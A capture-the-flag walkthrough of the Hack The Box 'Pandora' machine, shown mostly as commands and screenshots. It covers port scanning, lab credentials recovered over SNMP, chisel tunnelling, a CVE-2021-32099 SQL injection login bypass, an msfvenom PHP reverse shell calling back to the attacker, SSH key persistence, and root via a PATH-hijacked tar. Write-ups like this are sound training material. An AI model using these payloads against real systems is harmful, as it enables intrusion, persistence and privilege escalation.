![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20box.png)

# nmap

## nmap all ports
````
nmap -p- --min-rate 1000 -T4 -v -oN nmap-all-ports 10.10.11.136

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20all%20ports.png)

## nmap services and versions
````
nmap -sCV -p 22,80 -o nmap-services-versions 10.10.11.133
`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/nmap%20services%20versions.png)

## gobuster
````
gobuster dir -u http://10.10.11.136 -w /opt/tools/SecLists/Discovery/Web-Content/common.txt -o gobuster-main

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/gobuster%20main.png)

# domain
## just static --> not exploitable
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20website.png)

## maybe udp ports are open
````
sudo nmap -sU -p- --min-rate 1000 -T 4 10.10.11.136

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/nmap%20udp%20all%20ports.png)

# msfconsole
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/snmp-enum%20reveals%20creds.png)

## creds
````
daniel:HotelBabylon23

`````

## pandora shell /etc/host reveals new local hosts
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/new%20local%20hosts.png)

# reverse port forward with chisel (and) proxychains

## attacker
````
./chisel server -p 3477 --reverse

./chisel server -p 3477 --socks5 --reverse

`````

## victim
````
./chisel client 10.10.14.7:3477 R:2222:127.0.0.1:80/tcp

./chisel client 13.37.13.37:3477 R:5000:socks

`````

## setup proxychains.conf
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/proxychains.conf.png)

## new login on localhost:2222
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/login%20localhost2222.png)

## pandora fms version in footer
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20fms%20version.png)

## pandora search exploit
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20login%20bypass.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/unauthenicated%20sql%20injection%20cve-2021-32099.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/cve-2021-32099.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/poc%20cve-2021-32099.png)

````
http://localhost:2222/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271

`````

## cve-2021-32099 burp request
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/burp%20malicious%20get%20request%20to%20retrieve%20phpsessid.png)

## burp response PHPSESSID
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/burp%20response%20phpsessid.png)
## PHPSESSID
````
9mp333j17bophj28at1vgcrkil
`````

## replace cookie and refresh browser --> dashboard
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20fms%20dashboard.png)

## pandora fms file manager with upload utility
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20fms%20file%20manager.png)

## create php reverse shell with msfvenom
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/msfvenom%20php%20reverse%20shell.png)

## php reverse shell
````
msfvenom -p php/reverse_php LHOST=10.10.14.7 LPORT=1111 -f raw > shell.php

`````

## shell.php is store within image folder
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20fms%20successfully%20uploaded%20shell.php.png)

## open shell.php --> reverse shell on port 1111
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20fms%20shell.php%20url.png)

## listening for reverse shell
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20nc%20listening%20for%20shell.png)

## user.txt
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20user.txt.png)

## attacker machine create ssh-keygen
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/generate%20ssh-kegen.png)

## create folder (mod 600) .ssh in /home/matt and inside .ssh folder create file authorized_keys
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandore%20shell%20create%20.ssh%20and%20authorized%20keys.png)

## pandora_backup file snippet reveals command: tar -cvf /root/..........
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora_backup%20snippet%20reveals%20tar%20as%20root.png)

## create malicious tar command
````
cd /tmp
echo "/bin/bash" > tar
chmod +x tar

export PATH=/tmp:$PATH

/usr/bin/pandora_backup

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20shell%20create%20malicious%20tar%20command.png)

## pandora root shell
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20shell%20find%20suid%20files.png)

## pandora root.txt
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Pandora/screenshots/pandora%20root.txt.png)
XXXXXXXXXXXXXX